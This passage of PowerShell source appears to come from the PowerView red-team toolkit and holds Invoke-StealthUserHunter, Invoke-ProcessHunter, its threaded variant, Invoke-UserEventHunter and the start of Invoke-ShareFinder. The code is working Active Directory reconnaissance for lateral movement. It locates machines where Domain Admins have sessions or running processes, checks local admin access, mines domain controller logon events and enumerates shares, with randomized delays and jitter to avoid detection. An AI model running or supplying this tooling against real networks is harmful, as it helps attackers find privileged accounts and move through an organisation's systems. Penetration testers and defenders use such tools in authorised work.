        Hunt for users who are effective local admins on a target server.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER SPN
        Use SPN records to get your target sets.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER StopOnSuccess
        Stop hunting after finding a user.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating fileservers, defaults to 0

        .PARAMETER Jitter
        Jitter for the fileserver delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for users file server locations.

        .PARAMETER ShowAll
        Return all user location results.

        .PARAMETER Source
        The systems to use for session enumeration ("DFS","DC","File","All"). Defaults to "all"

        .PARAMETER SearchForest
        Search all domains in the forest for target users instead of just
        a single domain.

        .EXAMPLE
        > Invoke-StealthUserHunter
        Finds machines on the local domain where domain admins have sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -Domain testing
        Finds machines on the 'testing' domain where domain admins have sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -UserList users.txt
        Finds machines on the local domain where users from a specified list have
        sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -CheckAccess
        Finds machines on the local domain where domain admins have sessions from
        and checks if the current user has local administrator access to those
        found machines.

        .EXAMPLE
        > Invoke-StealthUserHunter -GroupName "Power Users" -Delay 60
        Find machines on the domain where members of the "Power Users" groups
        have sessions with a 60 second (+/- *.3) randomized delay between
        touching each file server.

        .EXAMPLE
        > Invoke-StealthUserHunter -TargetServer FILESERVER
        Query FILESERVER for useres who are effective local administrators using
        Get-NetLocalGroup -Recurse, and hunt for that user set on the network.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [String]
        $UserName,

        [Switch]
        $SPN,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $UserList,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [string]
        [ValidateSet("DFS","DC","File","All")]
        $Source ="All",

        [Switch]
        $SearchForest
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # users we're going to be searching for
        $TargetUsers = @()

        # resulting servers to query
        $Servers = @()

        # random object for delay
        $randNo = New-Object System.Random

        # get the current user
        $CurrentUser = Get-NetCurrentUser
        $CurrentUserBase = ([Environment]::UserName).toLower()

        # get the target domain
        if($Domain){
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            # get ALL the domains in the forest to search
            $TargetDomains = Get-NetForestDomain | % { $_.Name }
        }
        else{
            # use the local domain
            $TargetDomains = Get-NetDomain | % { $_.Name }
        }

        Write-Verbose "[*] Running Invoke-StealthUserHunter with delay of $Delay"
        if($TargetDomains){
            foreach ($Domain in $TargetDomains){
                Write-Verbose "[*] Searching domain: $Domain"
            }
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    Write-Verbose "[*] Querying domain $Domain for hosts with filter '$HostFilter'"
                    $Hosts = Get-NetComputer -Domain $Domain -HostName $HostFilter
                }
            }
            else {
                Write-Verbose "[*] Querying current domain for hosts with filter '$HostFilter'"
                $Hosts = Get-NetComputer -HostName $HostFilter
            }
        }

        # if we're showing all results, skip username enumeration
        if($ShowAll){}
        # if we want to hunt for the effective domain users who can access a target server
        elseif($TargetServer){
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | ?{(-not $_.IsGroup) -and $_.IsDomain} | % { 
                $out = New-Object psobject
                $out | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
                $out | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
                ($_.AccountName).split("/")[1].toLower() 
                $out
            }
        }
        # if we get a specific username, only use that
        elseif($UserName){
            Write-Verbose "[*] Using target user '$UserName'..."
            $out = New-Object psobject
            $out | Add-Member Noteproperty 'MemberDomain' $(Get-NetDomain | %{$_.Name})
            $out | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
            $TargetUsers = @($out)
        }
        # get the users from a particular ADSpath if one is specified
        elseif($ADSpath){
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    # TODO: add $Domain into results for $TargetUsers
                    $TargetUsers += Get-NetUser -Domain $Domain -ADSpath $ADSpath | ForEach-Object {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'MemberDomain' $Domain
                        $out | Add-Member Noteproperty 'MemberName' $_.samaccountname
                        $out
                    }
                }
            }
            else {
                $domain = Get-NetDomain | %{$_.Name}
                $TargetUsers = Get-NetUser -ADSpath $ADSpath | ForEach-Object {
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'MemberDomain' $Domain
                    $out | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $out
                }
            }
        }
        # use a specific LDAP query string to query for users
        elseif($Filter){
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    Write-Verbose "[*] Querying domain $Domain for hosts with filter '$HostFilter'"
                    $TargetUsers += Get-NetUser -Domain $Domain -Filter $Filter | ForEach-Object {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'MemberDomain' $Domain
                        $out | Add-Member Noteproperty 'MemberName' $_.samaccountname
                        $out
                    }
                }
            }
            else {
                $domain = Get-NetDomain | %{$_.Name}
                $TargetUsers = Get-NetUser -Filter $Filter | ForEach-Object {
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'MemberDomain' $Domain
                    $out | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $out
                }
            }
        }
        # read in a target user list if we have one
        elseif($UserList){
            $TargetUsers = @()
            $domain = Get-NetDomain | %{$_.Name}

            # make sure the list exists
            if (Test-Path -Path $UserList){
                $TargetUsers = Get-Content -Path $UserList | ForEach-Object {
                    $out = New-Object psobject
                    $out | Add-Member Noteproperty 'MemberDomain' $Domain
                    $out | Add-Member Noteproperty 'MemberName' $_
                    $out
                }
            }
            else {
                Write-Warning "[!] Input file '$UserList' doesn't exist!"
                return
            }
        }
        else{
            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                    # $TargetUsers += Get-NetUser -Domain $Domain -Filter $Filter | ForEach-Object {$_.samaccountname}
                    $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain
                }
            }
            else {
                # otherwise default to the group name to query for target users
                Write-Verbose "[*] Querying domain group '$GroupName' for target users..."
                $TargetUsers = Get-NetGroupMember -GroupName $GroupName
            }
        }

        if ((-not $ShowAll) -and (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0))){
            Write-Warning "[!] No users found to search for!"
            return
        }
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {

            [Array]$Hosts

            if($TargetDomains) {
                foreach ($Domain in $TargetDomains){
                    if ($Source -eq "File"){
                        Write-Verbose "[*] Querying domain $Domain for File Servers..."
                        $Hosts += Get-NetFileServer -Domain $Domain

                    }
                    elseif ($Source -eq "DFS"){
                        Write-Verbose "[*] Querying domain $Domain for DFS Servers..."
                        $Hosts += Get-DFSshare -Domain $Domain | % {$_.RemoteServerName}
                    }
                    elseif ($Source -eq "DC"){
                        Write-Verbose "[*] Querying domain $Domain for Domain Controllers..."
                        $Hosts += Get-NetDomainController -Domain $Domain | % {$_.Name}
                    }
                    elseif ($Source -eq "All") {
                        Write-Verbose "[*] Querying domain $Domain for DCs/Fileservers..."
                        $Hosts += Get-NetFileServer -Domain $Domain
                        $Hosts += Get-NetDomainController -Domain $Domain | % {$_.Name}
                    }
                }
            }

            else {
                if ($Source -eq "File"){
                    Write-Verbose "[*] Querying domain for File Servers..."
                    if ($TargetUsers) {
                        [Array]$Hosts = Get-NetFileServers -Domain $targetDomain -TargetUsers $TargetUsers
                    } 
                    else {
                        [Array]$Hosts = Get-NetFileServers -Domain $targetDomain
                    }
                }
                elseif ($Source -eq "DC"){
                    Write-Verbose "[*] Querying domain for Domain Controllers..."
                    $Hosts += Get-NetDomainController | % {$_.Name}
                }
                elseif ($Source -eq "All") {
                    Write-Verbose "[*] Querying domain $targetDomain for hosts..."
                    if ($TargetUsers) {
                        [Array]$Hosts = Get-NetFileServers -Domain $targetDomain -TargetUsers $TargetUsers
                    } 
                    else {
                        [Array]$Hosts = Get-NetFileServers -Domain $targetDomain
                    }
                    $Hosts += Get-NetDomainControllers -Domain $targetDomain | % {$_.Name}
                }
            }
        }

        # remove any null target users/hosts
        $TargetUsers = $TargetUsers | ?{$_}
        $Hosts = $Hosts | ?{$_}

        # uniquify the host list and then randomize it
        $Hosts = $Hosts | Sort-Object -Unique
        $Hosts = Get-ShuffledArray $Hosts
        Write-Verbose "[*] Total number of hosts: $($Hosts.Count)"

        $counter = 0

        # iterate through each target file server
        foreach ($server in $Hosts){

            $found = $false
            $counter = $counter + 1

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            Write-Verbose "[*] Enumerating host $server ($counter of $($Hosts.count))"

            # optionally check if the server is up first
            $up = $true
            if(-not $NoPing){
                $up = Test-Server -Server $server
            }
            if ($up){
                # get active sessions and see if there's a target user there
                $sessions = Get-NetSession -HostName $server
                
                foreach ($session in $sessions) {
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    $username = $username.toLower().trim()
                    if($cname -and $cname.StartsWith("\\")){
                        $cname = $cname.TrimStart("\")
                    }

                    # make sure we have a result
                    if (($username) -and ($username -ne '') -and ($username -ne $CurrentUserBase)){
                        # if the session user is in the target list, display some output

                        if ($ShowAll){
                            $out = new-object psobject
                            $out | add-member Noteproperty 'MemberDomain' $_.MemberDomain
                            $out | add-member Noteproperty 'MemberName' $username
                            $out | add-member Noteproperty 'Computer' $server
                            $ip = Get-HostIP -hostname $Server
                            $out | add-member Noteproperty 'IP' $ip
                            $out | add-member Noteproperty 'SessionFrom' $cname

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                $out | add-member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | add-member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                        else {
                            $TargetUsers | ? {$_.MemberName -and ($_.MemberName.tolower().trim() -eq $username)} | % {
                                $out = new-object psobject
                                $out | add-member Noteproperty 'MemberDomain' $_.MemberDomain
                                $out | add-member Noteproperty 'MemberName' $username
                                $out | add-member Noteproperty 'Computer' $server
                                $ip = Get-HostIP -hostname $Server
                                $out | add-member Noteproperty 'IP' $ip
                                $out | add-member Noteproperty 'SessionFrom' $cname

                                # see if we're checking to see if we have local admin access on this machine
                                if ($CheckAccess){
                                    $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                    $out | add-member Noteproperty 'LocalAdmin' $admin
                                }
                                else{
                                    $out | add-member Noteproperty 'LocalAdmin' $Null
                                }
                                $found = $True
                                $out

                            } 
                        }
                    }
                }
            }

            if ($StopOnSuccess -and $found) {
                Write-Verbose "[*] Returning early"
                return
           }
        }
    }
}


function Invoke-ProcessHunter {
    <#
        .SYNOPSIS
        Query the process lists of remote machines, searching for
        processes with a specific name or owned by a specific user.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ProcessName
        The name of the process to hunt, or a comma separated list of names.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER UserFilter
        The complete LDAP filter string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER RemoteUserName
        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

        .PARAMETER RemotePassword
        The password to use for the WMI call on a remote system.

        .PARAMETER StopOnSuccess
        Stop hunting after finding a process.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain for query for machines.

        .EXAMPLE
        > Invoke-ProcessHunter -Domain 'testing'
        Finds machines on the 'testing' domain where domain admins have a
        running process.

        .EXAMPLE
        > Invoke-ProcessHunter -UserList users.txt -HostList hosts.txt
        Finds machines in hosts.txt where any members of users.txt have running
        processes.

        .EXAMPLE
        > Invoke-ProcessHunter -GroupName "Power Users" -Delay 60
        Find machines on the domain where members of the "Power Users" groups have
        running processes with a 60 second (+/- *.3) randomized delay between
        touching each host.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $ProcessName,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $ADSpath,

        [String]
        $UserFilter,

        [String]
        $UserName,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $UserList,

        [String]
        $Domain

    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # users we're going to be searching for
        $TargetUsers = @()

        # random object for delay
        $randNo = New-Object System.Random

        # get the current user
        $CurrentUser = Get-NetCurrentUser
        $CurrentUserBase = ([Environment]::UserName).toLower()

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-ProcessHunter with a delay of $delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
        }

        if(!$ProcessName) {
            Write-Verbose "No process name specified, building a target user set"
            # if we get a specific username, only use that
            if ($UserName){
                $TargetUsers += $UserName.ToLower()
            }
            # get the users from a particular ADSpath if one is specified
            elseif($ADSpath){
                $TargetUsers = Get-NetUser -ADSpath $ADSpath | ForEach-Object {$_.samaccountname}
            }
            # use a specific LDAP query string to query for users
            elseif($UserFilter){
                $TargetUsers = Get-NetUser -Filter $UserFilter | ForEach-Object {$_.samaccountname}
            }
            # read in a target user list if we have one
            elseif($UserList){
                $TargetUsers = @()
                # make sure the list exists
                if (Test-Path -Path $UserList){
                    $TargetUsers = Get-Content -Path $UserList
                }
                else {
                    Write-Warning "[!] Input file '$UserList' doesn't exist!"
                    return
                }
            }
            else{
                # otherwise default to the group name to query for target users
                $temp = Get-NetGroupMember -GroupName $GroupName -Domain $targetDomain | % {$_.MemberName}
                # lower case all of the found usernames
                $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
            }

            $TargetUsers = $TargetUsers | ForEach-Object {$_.ToLower()}

            if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
                Write-Warning "[!] No users found to search for!"
                return
            }
        }
    }

    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        
        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $HostCount = $Hosts.Count

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            # make sure we get a server name
            if ($server -ne ''){
                $found = $false

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating target $server ($counter of $($Hosts.count))"

                # try to enumerate all active processes on the remote host
                $processes = Get-NetProcess -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -HostName $server -ErrorAction SilentlyContinue

                foreach ($process in $processes) {

                    # if we're hunting for a process name or comma-separated names
                    if($ProcessName) {
                        $ProcessName.split(",") | %{
                            if ($process.Process -match $_){
                                $found = $true
                                $process
                            }
                        }
                    }
                    # if the session user is in the target list, display some output
                    elseif ($TargetUsers -contains $process.User){
                        $found = $true
                        $process
                    }
                }

                if ($StopOnSuccess -and $found) {
                    Write-Verbose "[*] Returning early"
                    return
                }
            }
        }
    }
}


function Invoke-ProcessHunterThreaded {
    <#
        .SYNOPSIS
        Query the process lists of remote machines and searches
        the process list for a target process name. Uses multithreading 
        to speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER ProcessName
        The name of the process to hunt. Defaults to putty.exe

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER RemoteUserName
        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

        .PARAMETER RemotePassword
        The password to use for the WMI call on a remote system.

        .PARAMETER StopOnSuccess
        Stop hunting after finding a process.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain for query for machines.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $ProcessName = "putty",

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $RemoteUserName,

        [String]
        $RemotePassword,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [int]
        $MaxThreads = 20
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $ProcessName, $RemoteUserName, $RemotePassword)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){

                # try to enumerate all active processes on the remote host
                # and search for a specific process name
                $processes = Get-NetProcess -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -HostName $server -ErrorAction SilentlyContinue

                foreach ($process in $processes) {
                    # if the session user is in the target list, display some output
                    if ($process.Process -match $ProcessName){
                        $found = $true
                        $process
                    }
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputer -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('ProcessName', $ProcessName).AddParameter('RemoteUserName', $RemoteUserName).AddParameter('RemotePassword', $RemotePassword)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }
        $pool.Dispose()
    }
}


function Invoke-UserEventHunter {
    <#
        .SYNOPSIS
        Queries all domain controllers on the network for account
        logon events (ID 4624) and TGT request events (ID 4768),
        searching for target users.

        Note: Domain Admin (or equiv) rights are needed to query
        this information from the DCs.

        Author: @sixdub, @harmj0y
        License: BSD 3-Clause

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER ADSpath
        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

        .PARAMETER Filter
        A customized ldap filter string to use, e.g. "(description=*admin*)"

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER Domain
        Domain to query for DCs and users.

        .PARAMETER SearchDays
        Number of days back to search logs for. Default 3.
    #>

    [CmdletBinding()]
    param(
        [String]
        $GroupName = 'Domain Admins',

        [String]
        $ADSpath,

        [String]
        $Filter,

        [String]
        $UserName,

        [String]
        $UserList,

        [String]
        $Domain,

        [int32]
        $SearchDays = 3
    )

    if ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # users we're going to be searching for
    $TargetUsers = @()

    # if we get a specific username, only use that
    if ($UserName){
        $TargetUsers += $UserName.ToLower()
    }
    # get the users from a particular ADSpath/filter string if one is specified
    elseif($ADSpath -or $Filter){
        $TargetUsers = Get-NetUser -Filter $Filter -ADSpath $ADSpath -Domain $Domain | ForEach-Object {$_.samaccountname}
    }
    # read in a target user list if we have one
    elseif($UserList){
        $TargetUsers = @()
        # make sure the list exists
        if (Test-Path -Path $UserList){
            $TargetUsers = Get-Content -Path $UserList
        }
        else {
            Write-Warning "[!] Input file '$UserList' doesn't exist!"
            return
        }
    }
    else{
        # otherwise default to the group name to query for target users
        $temp = Get-NetGroupMember -GroupName $GroupName -Domain $Domain | % {$_.MemberName}
        # lower case all of the found usernames
        $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
    }

    $TargetUsers = $TargetUsers | ForEach-Object {$_.ToLower()}

    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
        Write-Warning "[!] No users found to search for!"
        return
    }

    $DomainControllers = Get-NetDomainController -Domain $Domain | % {$_.Name}

    foreach ($DC in $DomainControllers){
        Write-Verbose "[*] Querying domain controller $DC for event logs"

        Get-UserEvent -ComputerName $DC -EventType 'all' -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | Where-Object {
            # filter for the target user set
            $TargetUsers -contains $_.UserName
        }
    }
}


function Invoke-ShareFinder {
    <#
        .SYNOPSIS
        Finds (non-standard) shares on machines in the domain.

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputer, then for
        each server it lists of active shares with Get-NetShare. Non-standard shares
        can be filtered out with -Exclude* flags.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER ExcludeStandard
        Exclude standard shares from display (C$, IPC$, print$ etc.)

        .PARAMETER ExcludePrint
        Exclude the print$ share

        .PARAMETER ExcludeIPC
        Exclude the IPC$ share

        .PARAMETER CheckShareAccess
        Only display found shares that the local user has access to.

        .PARAMETER CheckAdmin
        Only display ADMIN$ shares the local user has access to.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines.

        .EXAMPLE
        > Invoke-ShareFinder
        Find shares on the domain.

        .EXAMPLE
        > Invoke-ShareFinder -ExcludeStandard
        Find non-standard shares on the domain.

        .EXAMPLE
        > Invoke-ShareFinder -Delay 60
        Find shares on the domain with a 60 second (+/- *.3)
        randomized delay between touching each host.

        .EXAMPLE
        > Invoke-ShareFinder -HostList hosts.txt
        Find shares for machines in the specified hostlist.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [Switch]
        $ExcludeStandard,

        [Switch]
        $ExcludePrint,

        [Switch]
        $ExcludeIPC,

        [Switch]
        $NoPing,

        [Switch]
        $CheckShareAccess,

        [Switch]
        $CheckAdmin,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [String]
        $Domain
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # figure out the shares we want to ignore
        [String[]] $excludedShares = @('')

        if ($ExcludePrint){
            $excludedShares = $excludedShares + "PRINT$"
        }
        if ($ExcludeIPC){
            $excludedShares = $excludedShares + "IPC$"
        }
        if ($ExcludeStandard){
            $excludedShares = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }

        # random object for delay
        $randNo = New-Object System.Random

        # get the current user
        $CurrentUser = Get-NetCurrentUser

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-ShareFinder with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else {
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return $null
            }
        }
        else{
            # otherwise, query the domain for target hosts
            if($HostFilter){
                Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
                $Hosts = Get-NetComputer -Domain $targetDomain -HostName $HostFilter
            }
            else {
                Write-Verbose "[*] Querying domain $targetDomain for hosts..."
                $Hosts = Get-NetComputer -Domain $targetDomain
            }
        }
    }

    process{

